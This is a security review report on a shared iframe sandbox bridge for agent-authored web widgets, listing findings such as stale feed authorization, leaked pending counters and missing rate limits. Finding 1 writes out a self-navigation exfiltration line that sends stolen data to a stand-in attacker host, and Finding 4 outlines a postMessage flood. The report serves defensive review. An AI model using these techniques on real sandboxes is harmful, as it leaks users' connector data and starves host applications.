# Review Report — Cluster 9: Shared sandbox host (bridge + web frames)

Scope: `packages/client-runtime/src/watchAppBridge.ts`, `apps/web/src/components/watch/{WatchAppFrame,WatchAppWidget,WatchAppTapToLoad,WatchAppSourceDialog,useWatchAppMounts}.ts(x)`, `packages/client-runtime/package.json`. Cross-checked: `apps/mobile/src/features/watch/WatchAppWebView.tsx` (twin), `apps/server/src/watch/WidgetTranspileService.ts` (hash chain + limits), `WatchWidgetBody.tsx`/`WatchScreen.tsx` (prop wiring), other `message` listeners in web.

## Verified solid

- CSP: `default-src 'none'` + `connect-src/img-src/font-src 'none'` + hash-only `script-src` + `form-action/base-uri 'none'` (`watchAppBridge.ts:501`). Hash interpolation is injection-proof (`SCRIPT_HASH_PATTERN`, :487). Hash-only script-src blocks inline event-handler attributes and `javascript:` URLs (no `'unsafe-inline'`/`'unsafe-hashes'`), so `innerHTML`/`onerror` markup injection from the bundle or `T3.h` is inert; `</script>` truncation degrades to a blocked script as commented.
- postMessage: inbound auth is `event.source === frame.contentWindow` (`WatchAppFrame.tsx:204`) — correct approach for opaque-`null` origin; sibling frames cannot spoof `source`. Host posts are window-scoped (`:171`). Other app listeners (`McpAppFrame`, `BrowserDocumentFrame`) use the same source check — a widget's arbitrary posts to `window.parent` can't spoof them.
- Manifest enforcement: undeclared subscribe/action dropped + `onViolation` (:178-186, :259-267); `instanceId` uses strict `!==` against host-resolved `bound` and the host always passes `bound`, never the frame's value (:187-209). Unsubscribe-during-open race closes the late feed (:215-220). `dispose` guards all posting (:135).
- Server side (context): `scriptHash = sha256Base64(bundle)`, `artifactHash` covers manifest+source; client re-verifies `artifactHash` on fetch (`WatchAppWidget.tsx:253`). Manifest arrays capped at 64 entries at publish.

## Findings

### [SEVERITY: HIGH] Finding 1: Sandbox permits self-navigation — connector data is exfiltratable despite `connect-src 'none'`

**File**: packages/client-runtime/src/watchAppBridge.ts:497-518; apps/web/src/components/watch/WatchAppFrame.tsx:149-161
**Problem**: The "zero network" posture covers subresource/fetch channels, but top-level frame navigation is not CSP-governed (`navigate-to` is unimplemented in browsers and absent anyway) and `sandbox="allow-scripts"` has no modifier that blocks a frame navigating _itself_.
**Evidence**: The artifact can run `location.href = "https://attacker.tld/?exfil=" + encodeURIComponent(stolen)` — or trigger it via injected `<meta http-equiv="refresh">` (bundle `</script>` splice tail becomes live markup) or `<a href>` click. That is a real GET request carrying connector subscription data, `hostContext`, and anything the widget computed. The nav watchdog only detects on `load` (`onFrameLoad`, count > 1) — _after_ the request has left; detection is post-mortem. Additionally, until `load` fires the departing/hostile document still passes `event.source === target()` and receives in-flight `deliver` posts — a cross-origin page loaded in the frame gets `postMessage`d feed data during the gap. Mobile prevents this entirely (`onShouldStartLoadWithRequest` denies everything but `about:blank`, `WatchAppWebView.tsx:250`); web has no equivalent interception point.
**Impact**: Any data delivered over `t3.watch/data` to an agent-authored widget is exfiltratable to an arbitrary origin. The sandbox contains code execution but not information flow out.
**Suggestion**: No web-platform primitive fully closes self-navigation in a srcdoc iframe. At minimum: (a) record this residual explicitly in the code comment/security model next to the "zero network" claim (currently misleading); (b) consider sensitivity — don't feed connector secrets/credentials through `deliver`/`hostContext`; (c) if feed data is sensitive, gate watch widgets on environments where this channel is acceptable, or evaluate wrapping the iframe document load so navigations hit a deny-all path (none exists on web — flag as known gap vs. mobile parity).

### [SEVERITY: MEDIUM] Finding 2: `opening` leak on pending-cap refusal — phantom subscription fakes success forever

**File**: packages/client-runtime/src/watchAppBridge.ts:203-228
**Problem**: `opening.add(name)` runs before `answer()`'s `pending >= MAX_PENDING_REQUESTS` check. When the cap refuses the request, `name` stays in `opening` permanently.
**Evidence**: `opening.add(name)` (:207) → `answer(id, ...)` (:208) → `fail(id, ...); return` (:151-154) with `name` never removed. Every later `t3.watch/subscribe` for that name hits `open.has(name) || opening.has(name)` (:203) → `respond(id, {})` — reports success while no feed was ever opened and none ever will be. The leak persists until `dispose`.
**Impact**: A widget that saturates 16 pending requests (e.g., hanging `invokeAction`s or slow opens) then permanently wedges any subscription name attempted during saturation — silent data-loss state where the widget believes it's subscribed.
**Suggestion**: Perform the pending check before `opening.add(name)`, or `opening.delete(name)` inside a refusal path in `answer` (e.g., pass an `onRefuse` cleanup).

### [SEVERITY: MEDIUM] Finding 3: Synchronous throw in a host handler leaks `pending` and escapes `receive`

**File**: packages/client-runtime/src/watchAppBridge.ts:150-166
**Problem**: `void run().then(...)` — if `run()` throws synchronously (a non-`async` `openSubscription`/`invokeAction` implementation, or a throwing property access), `pending` is never decremented and the exception propagates out of `receive` into the `message` event listener.
**Evidence**: `pending += 1` (:155) precedes `run()` (:156); only the `.then` callbacks decrement. A sync throw skips decrement and surfaces as an uncaught error in the window listener (`WatchAppFrame.tsx:202-206`). 16 such calls permanently refuse all subsequent requests (Finding 2's cap).
**Impact**: Latent contract bug — current web/mobile handlers are `async` so today's impls can't throw sync, but `makeWatchAppHost` is a generic transport; any future/non-async handler wedges the bridge irrecoverably.
**Suggestion**: `void Promise.resolve().then(run).then(ok, fail)` or try/catch around `run()` with `pending -= 1` + `fail(id, ...)`.

### [SEVERITY: MEDIUM] Finding 4: No rate limiting on synchronous bridge paths — postMessage flood starves the host thread

**File**: packages/client-runtime/src/watchAppBridge.ts:231-281; apps/web/src/components/watch/WatchAppWidget.tsx:107,175-187
**Problem**: `ping`, `hostContext`, `unsubscribe`, unknown-method, malformed-request, and every manifest-violation path all process and post a reply synchronously with no cap. The 16-pending cap only covers `subscribe`/`action` async work; the 256KB cap doesn't bound message _rate_.
**Evidence**: A widget loop `while(true) T3-bridge-ping` (or spamming undeclared subscribes) forces a full parent-event-loop turn per message: validate → `handleRequest` → `post` structured-clone back. Worse, each undeclared call runs `violate()` → `onViolation` → `setViolation` (:280 → `WatchAppWidget.tsx:107`) → a React state update per message — sustained render churn on the host's main thread. The widget can also flood huge-but-valid messages: `jsonBytes` stringify (:286) is O(n) per message before the drop.
**Impact**: A hostile/buggy widget can starve the app's UI thread indefinitely — a self-contained DoS that the sandbox's script authorization can't prevent (the artifact is legitimately hash-authorized).
**Suggestion**: Token-bucket `receive` (e.g., drop messages beyond N per window, counting a violation once); coalesce `onViolation` reporting (dedupe/last-wins per widget); short-circuit the byte check for `typeof data === "string"` before stringify.

### [SEVERITY: MEDIUM] Finding 5: Open connector feeds are never re-authorized when the row's binding changes

**File**: packages/client-runtime/src/watchAppBridge.ts:187-209; apps/web/src/components/watch/WatchAppFrame.tsx:172-180
**Problem**: `connectorInstanceId` is read live per subscribe ("a live config change tightens the check immediately") — but only for _new_ requests. Feeds already open keep the subscribe-time `instanceId` snapshot.
**Evidence**: `openSubscription` stores `feed = { name, instanceId }` in React state (`WatchAppFrame.tsx:176-179`); `WatchAppConnectorFeed` streams `props.feed.instanceId` (:65). If the user repoints the widget's connector binding (or clears it), an already-open subscription keeps streaming the **old** instance's data into the frame — `open.has(name)` dedup (:203) means a re-subscribe returns `{}` without rebinding. Nothing closes or re-checks open feeds on binding change.
**Impact**: Stale authorization — the widget document continues receiving a connector instance it is no longer bound to (indefinitely, until unsubscribe/dispose). Same-class breach the `foreignInstance` check exists to prevent, on a slower timescale.
**Suggestion**: Key `subscriptions` entries by `(name, instanceId)` and re-derive on binding change — or dispose/close all open feeds when `connectorInstanceId()`'s value changes (watch it in `WatchAppFrame` and close through `host`).

### [SEVERITY: MEDIUM] Finding 6: Action arguments bypass instance-binding — `instanceId` only enforced on subscribe

**File**: packages/client-runtime/src/watchAppBridge.ts:253-277
**Problem**: The "frame-supplied instanceId is never trusted" guarantee stops at `t3.watch/subscribe`. `t3.watch/action` hands `params.arguments` verbatim to the host handler after only a name check.
**Evidence**: `invokeAction({ name, arguments: args })` (:273-275) — no rewriting or rejection of an `arguments.instanceId` (or any resource selector). If any declared action handler interprets a connector/instance/target field from args, the frame picks it freely — foreign-instance access through the action channel.
**Impact**: Latent: on web today `WatchWidgetBody` never passes `actions` (`WatchWidgetBody.tsx:134-144`), so every action refuses — but the bridge contract and mobile twin expose the surface, and any future handler that trusts an id-shaped arg reopens the containment hole.
**Suggestion**: Either strip/forbid `instanceId` keys in action arguments at the bridge, or document on `WatchAppHostHandlers.invokeAction` that arguments are fully frame-controlled and handlers must authorize against the widget binding themselves.

### [SEVERITY: MEDIUM] Finding 7: `registryKey` reset strands still-visible widgets in `unmounted`; `requestMount` can mount invisible widgets

**File**: apps/web/src/components/watch/useWatchAppMounts.ts:27-38; apps/web/src/components/watch/WatchAppWidget.tsx:123-136; packages/client-runtime/src/state/watchMounts.ts:119-129
**Problem**: (a) When `registryKey` (`${environmentId}:${page.id}`, `WatchScreen.tsx:183`) changes, the hook swaps in a fresh registry with empty states — the comment promises "fresh visibility reports" reseat widgets, but `WatchAppWidget`'s `IntersectionObserver` effect deps are `[widget.id]` only: it does not re-`observe`, and IO does not re-fire for an element whose intersection status didn't change. A widget persisting across the key change (same `widget.id` on the new page/env) sits in view reporting nothing → permanently `unmounted` until it scrolls out and back. (b) `requestMount` mounts any id — no visibility check; a tap racing a `setHidden` (or a stale placeholder render) seats an offscreen widget and evicts a visible one.
**Evidence**: `setBound` reset (:32-38) → `states = {}` → `stateOf` returns `"unmounted"` (:96); observer established once per `widget.id` (`WatchAppWidget.tsx:131`) with `onVisibilityChangeRef` only updating the _callback_, never re-subscribing → no new entry until a real intersection change.
**Impact**: Widgets silently dead after page/environment switches (a state users hit via page tabs); offscreen mount steals a cap seat.
**Suggestion**: After a registry swap, force a re-report — re-run the observer effect on `registryKey` (pass it into `WatchAppWidget`), or have `useWatchAppMounts` reseed visibility by treating registry reset as "all hidden → wait for report" with the observer effect re-subscribing (disconnect + observe produces an initial entry). Gate `requestMount` on standby/visible membership in the registry.

### [SEVERITY: LOW] Finding 8: Byte cap enforced after a full `JSON.stringify` allocation

**File**: packages/client-runtime/src/watchAppBridge.ts:112-118, 286
**Problem**: `jsonBytes` stringifies the entire structured-clone payload to measure it. A widget can post multi-hundred-MB strings/objects; the cap drops them, but only after an O(n) stringify + copy per message — repeated sends spike memory/CPU. Cheap improvement: early-exit for oversized string fields, or measure `data` when it's already a string.

### [SEVERITY: LOW] Finding 9: No cap on concurrently-open subscriptions; churn restarts server streams unboundedly

**File**: packages/client-runtime/src/watchAppBridge.ts:203-228; apps/web/src/components/watch/WatchAppFrame.tsx:60-89
**Problem**: Up to 64 declared names (server `maxBridgeDeclarations`) may all be open at once — each mounts a `WatchAppConnectorFeed` holding a live `connectorStream` RPC subscription. Beyond that, subscribe→unsubscribe→subscribe cycles (unsubscribe is free, not pending-counted) tear down and recreate server streams at whatever rate the widget can round-trip — no debounce. Same for action throughput (16 concurrent but unbounded rate). Mount-state churn on fast scroll compounds it (full iframe + stream teardown/recreate per visibility edge). Bounded blast radius (~64 streams × 6 frames) but worth an explicit cap/debounce.

## Notes (checked, no finding)

- `Predicate.isObject` excludes arrays — `params`/`arguments` can't be smuggled as arrays.
- `handle` in prelude accepts any `message` event, but only `window.parent` can reach the frame — opaque-origin widgets can't enumerate siblings.
- `onLoad` count watchdog: srcdoc set pre-connect fires exactly one load; React keeps `srcDoc` stable so no reload on re-render.
- `subscriptions`/`open`/`opening` Sets and Set-iteration-during-delete patterns are used correctly.
